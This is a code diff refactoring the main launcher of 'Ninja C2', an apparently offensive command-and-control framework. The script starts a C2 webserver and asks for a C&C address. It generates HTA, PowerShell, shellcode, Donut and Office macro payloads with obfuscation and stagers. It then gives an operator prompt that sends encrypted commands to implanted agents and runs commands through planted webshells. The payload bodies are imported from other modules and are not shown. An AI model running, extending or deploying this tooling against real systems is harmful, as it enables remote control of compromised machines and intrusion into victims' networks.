@@ -1,150 +1,179 @@
-# Embedded file name: muddyc3.py
-import _thread
-import signal
-import threading
+#!/usr/bin/env python3
 
-from core import header
+__program__ = "Ninja c2"
+__version__ = "2.0"
+
+import _thread
+import threading
+from shlex import split
+
+from rich.console import Console
+import argparse
 from core.cmd import *
 from core.payloads import *
-from rich.console import Console
 
 console = Console()
 
 
-# def signal_handler(sig, frame):
-#    print("\r")
-# console.print('\n[!] Exit by typing exit', style="bold red", end="")
+class Ninja:
+    def __init__(self, arg):
+        self.quiet = arg.quiet
 
-
-def create_dirs(dirs):
-    try:
-        os.makedirs(dirs)
-    except OSError:
-        return
-
-
-def NinjaCMD():
-    """TODO:
-    * Handle Ctrl+C and Ctrl+D [Done]
-    * Disable verbose output of payloads..
-    1- Explore and implement default tool colors
-    2- Try to implement shlex
-    3- Replace pretty tables with rich.tables for a pretty output
-    4- Display listeners in a nicer way, payloads in boxes
-    5- Add traceback and logging mechanism
-    6- Add a functionality to store creds for users in a file for every specific campaign
-    7- Learn more about c2 servers, increase your knowledge and have fun...
-    """
-    while True:
+    def create_dirs(self, dirs):
         try:
-            readline.set_completer(Command_Completer)
-            readline.parse_and_bind("tab: complete")
-            readline.write_history_file(".history")
-            if config.POINTER == 'main':
-                command = console.input(f'[bold yellow]({config.BASE}:{config.POINTER})> [/ bold yellow]')
-            elif config.POINTER == 'webshell':
-                command = console.input(f'[bold cyan]({config.BASE}:{config.POINTER})[/bold cyan]')
-            elif config.Implant_Type == 'agent':
-                agent = str(config.AGENTS[config.POINTER][0])
-                agent2 = config.AGENTS[config.POINTER][5]
-                command = console.input(f'[bold green]({config.BASE} : Agent({agent})-{agent2}[/bold green]')
-            elif config.Implant_Type == 'webshell':
-                webshell1 = str(config.WEBSHELLS[config.POINTER][0])
-                webshell2 = config.WEBSHELLS[config.POINTER][1]
-                command = console.input(f'[bold red]({config.BASE} : webshell({webshell1})@{webshell2})[/bold red]')
-            bcommand = command.strip().split()  # Recommended to use shlex (more reliable cmd parsing)
+            os.makedirs(dirs)
+        except OSError:
+            return
 
-            if bcommand:
-                if bcommand[0] in cmd.COMMANDS:
-                    result = getattr(globals()['cmd'](), bcommand[0])(bcommand)
-                elif bcommand[
-                    0] not in cmd.COMMANDS and config.POINTER != 'main' and config.POINTER != 'webshell' and config.Implant_Type == 'agent':
-                    config.COMMAND[config.POINTER].append(encrypt(AESKey, command.strip()))
+    def NinjaCMD(self):
+        while True:
+            try:
+                """Adding tab completion and adding to history file"""
+                readline.set_completer(Command_Completer)
+                readline.parse_and_bind("tab: complete")
+                readline.write_history_file(".history")
 
-                elif bcommand[
-                    0] not in cmd.COMMANDS and config.POINTER != 'main' and config.POINTER != 'webshell' and config.Implant_Type == 'webshell':
-                    try:
-                        _thread.start_new_thread(webshell.webshell_execute,
-                                                 (config.WEBSHELLS[config.POINTER], command.strip(),))
+                """Displaying Ninja prompt based on what we are interacting with"""
+                if config.POINTER == 'main':
+                    command = console.input(f'[bold yellow]({config.BASE}:{config.POINTER})>[/ bold yellow] ')
+                elif config.POINTER == 'webshell':
+                    command = console.input(f'[bold cyan]({config.BASE}:{config.POINTER})> [/bold cyan]')
+                elif config.Implant_Type == 'agent':
+                    agent = str(config.AGENTS[config.POINTER][0])
+                    agent2 = config.AGENTS[config.POINTER][5]
+                    command = console.input(f'[bold green]({config.BASE} : Agent({agent})-{agent2})[/bold green]')
+                elif config.Implant_Type == 'webshell':
+                    webshell1 = str(config.WEBSHELLS[config.POINTER][0])
+                    webshell2 = config.WEBSHELLS[config.POINTER][1]
+                    command = console.input(f'[bold red]({config.BASE} : webshell({webshell1})@{webshell2})[/bold red]')
+                bcommand = split(command)  # split from shlex module
 
-                    except:
-                        console.print("[!] Error: unable to start thread", style="bold red")
-                        console.print_exception()
-        except (EOFError, KeyboardInterrupt):  # Handles Ctrl+C and Ctrl+D (NO exit)
-            console.print("\n[!] Type exit", style="bold red")
-            continue
+                if bcommand:
+                    if bcommand[0] in cmd.COMMANDS:
+                        result = getattr(globals()['cmd'](), bcommand[0])(bcommand)
+                    elif bcommand[0] not in cmd.COMMANDS and config.POINTER != 'main' and config.POINTER != 'webshell' and config.Implant_Type == 'agent':
+                        config.COMMAND[config.POINTER].append(encrypt(AESKey, command.strip()))
 
+                    elif bcommand[0] not in cmd.COMMANDS and config.POINTER != 'main' and config.POINTER != 'webshell' and config.Implant_Type == 'webshell':
+                        try:
+                            _thread.start_new_thread(webshell.webshell_execute,
+                                                     (config.WEBSHELLS[config.POINTER], command.strip(),))
 
-def main():
-    create_dirs("payloads")
-    create_dirs("downloads")
-    create_dirs("file")
-    create_dirs("images")
-    create_dirs("DA")
-    create_dirs("kerberoast")
-    create_dirs("screenshots")
+                        except:
+                            console.print("[!] Error: unable to start thread", style="bold red")
+                            console.print_exception()
+            except (EOFError, KeyboardInterrupt):  # Handles Ctrl+C and Ctrl+D (NO exit)
+                console.print("\n[!] Type exit", style="bold red")
+                continue
 
-    # signal.signal(signal.SIGINT, signal_handler)
-    header.Banner()
+    def Make_Payloads(self):
+        print('+' + '-' * 60 + '+')
+        cmd().help()
+        print('+' + '-' * 60 + '+')
+        print(bcolors.OKBLUE + '(LOW):' + bcolors.ENDC)
+        hta_paylods()
+        print(bcolors.OKBLUE + '(MEDIUM):' + bcolors.ENDC)
+        pwsh_job()
+        print(bcolors.OKBLUE + '(HIGH):' + bcolors.ENDC)
+        pwsh_file()
+        pwsh_sct()
+        simple_payloads()
+        pwsh_base64()
+        pwsh_base52()
+        print('+' + '-' * 60 + '+')
+        config.PAYLOAD()
+        config.obfuscate()
+        config.STAGER()
+        cspayload()
+        cmd_shellcodex86()
+        cmd_shellcodex64()
+        word_macro()
+        excel_macro()
+        if not config.Donut:
+            console.log("[!] Donut is Disabled so , kindly create a new campaign", style="bold red")
+        else:
+            donut_shellcode()
+            config.migrator()
 
-    # config.set_key()
-    CC = []
-    if config.HOST == "" or config.PORT == "":
-        while len(CC) == 0:
-            CC = console.input('[cyan][-] Enter a DN/IP:port for C&C: IP:Port: [/cyan]')
-        CC = CC.split(':')
-        config.set_port(CC[1])
-        config.set_ip(CC[0])
-    # proxy = input('Enter PROXY:')
-    # if proxy:
-    #    ip = proxy
+    def main(self):
+        self.create_dirs("payloads")
+        self.create_dirs("downloads")
+        self.create_dirs("file")
+        self.create_dirs("images")
+        self.create_dirs("DA")
+        self.create_dirs("kerberoast")
+        self.create_dirs("screenshots")
 
-    server = threading.Thread(target=webserver.main, args=())
-    server.start()
-    time.sleep(0.5)
-    print('+' + '-' * 60 + '+')
-    cmd().help()
-    print('+' + '-' * 60 + '+')
-    print(bcolors.OKBLUE + '(LOW):' + bcolors.ENDC)
-    hta_paylods()
-    print(bcolors.OKBLUE + '(MEDIUM):' + bcolors.ENDC)
-    pwsh_job()
-    print(bcolors.OKBLUE + '(HIGH):' + bcolors.ENDC)
-    pwsh_file()
-    pwsh_sct()
-    simple_payloads()
-    pwsh_base64()
-    pwsh_base52()
-    print('+' + '-' * 60 + '+')
+        CC = []
+        if config.HOST == "" or config.PORT == "":
+            while len(CC) == 0:
+                CC = console.input('[cyan][-] Enter a DN/IP:port for C&C: IP:Port: [/cyan]')
+            CC = CC.split(':')
+            config.set_port(CC[1])
+            config.set_ip(CC[0])
 
-    config.PAYLOAD()
-    config.obfuscate()
-    config.STAGER()
-    cspayload()
-    if not config.Donut:
-        console.log("[!] Donut is Disabled so , kindly create a new campaign", style="bold red")
-    else:
-        donut_shellcode()
-        config.migrator()
-    cmd_shellcodex86()
-    cmd_shellcodex64()
-    word_macro()
-    excel_macro()
-    f = open(".history", "a").write("\n")
-    readline.read_history_file(".history")
-    try:
-        console.print("[*] Loading registered webshell list", style="cyan")
-        with open('.webshells', 'rb') as f:
-            config.WEBSHELLS = pickle.load(f)
-    except FileNotFoundError:
-        console.print("[!] Webshell list file doesn't exist.", style="red")
+        """Start webserver"""
+        server = threading.Thread(target=webserver.main, args=())
+        server.start()
+        time.sleep(0.5)
 
-    """Ninja Command line"""
-    NinjaCMD()
+        """Make payloads"""
+        self.Make_Payloads()
+
+        """Reading history file content to use"""
+        f = open(".history", "a").write("\n")
+        readline.read_history_file(".history")
+
+        """Loading webshell if exist"""
+        try:
+            console.print("[*] Loading registered webshell list", style="cyan")
+            with open('.webshells', 'rb') as f:
+                config.WEBSHELLS = pickle.load(f)
+        except FileNotFoundError:
+            console.print("[!] Webshell list file doesn't exist.\n", style="red")
+
+        """Start Ninja Command line"""
+        self.NinjaCMD()
+
+    @staticmethod
+    def Banner():
+        console.print(f"""[blue]
+    ███╗   ██╗██╗███╗   ██╗     ██╗ █████╗      ██████╗██████╗ 
+    ████╗  ██║██║████╗  ██║     ██║██╔══██╗    ██╔════╝╚════██╗
+    ██╔██╗ ██║██║██╔██╗ ██║     ██║███████║    ██║      █████╔╝
+    ██║╚██╗██║██║██║╚██╗██║██   ██║██╔══██║    ██║     ██╔═══╝ 
+    ██║ ╚████║██║██║ ╚████║╚█████╔╝██║  ██║    ╚██████╗███████╗
+    ╚═╝  ╚═══╝╚═╝╚═╝  ╚═══╝ ╚════╝ ╚═╝  ╚═╝     ╚═════╝╚══════╝	
+                                                            [/blue][bold cyan]Version: {config.VERSION}[/bold cyan]
+[bold yellow][-] Ninja C2 | Stealthy Pwn like a Ninja[/bold yellow]\n\n""")
 
 
 if __name__ == '__main__':
     try:
-        main()
+        """Adding arguments, Currently just for q peacefully and quiet startup"""
+        parser = argparse.ArgumentParser(formatter_class=argparse.ArgumentDefaultsHelpFormatter, add_help=False)
+        parser.add_argument('-q', '--quiet', help='Disable payload listing at the start')
+        args = parser.parse_args()
+        """Create an instance of the class"""
+        ninja = Ninja(args)
+        """Display banner"""
+        Ninja.Banner()
+        """Run Ninja"""
+        ninja.main()
     except Exception:
         console.print_exception()
+
+"""
+TODO:
+        * Handle Ctrl+C and Ctrl+D ===> [Done]
+        * Add clear screen option in core/cmd.py ===> [Done]
+        * Try to implement shlex (Needs more testing before implementing) ===> [Done]
+        * Replace pretty tables with rich.tables for a pretty output (Done for help command)
+        * Display listeners in a nicer way [with background colors] -> (Pending...)
+        * Explore and implement default tool colors --> (Pending...)
+        * Make a specific directory for every campaign based on a campaign name (add that option to start_campaign.py)
+        * Add traceback and logging mechanism
+        * Disable verbose output of payloads.. (Needs alot of work in the core/payloads.py (Display only if needed by cmd)
+        * Add new functionalities after having good knowledge in real life scenarios..
+        * Learn more about c2 servers, increase your knowledge and have fun...
+"""
